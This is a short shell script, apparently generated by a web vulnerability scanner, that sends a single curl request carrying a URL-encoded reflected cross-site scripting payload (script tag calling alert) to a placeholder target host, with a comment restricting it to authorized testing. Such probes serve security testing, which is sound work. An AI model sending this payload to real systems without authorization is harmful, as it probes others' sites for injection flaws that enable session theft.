#!/usr/bin/env sh
set -eu
# Authorized testing only. Replace TARGET after review.
curl -sS -i -X GET 'http://TARGET:8080/053.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*'
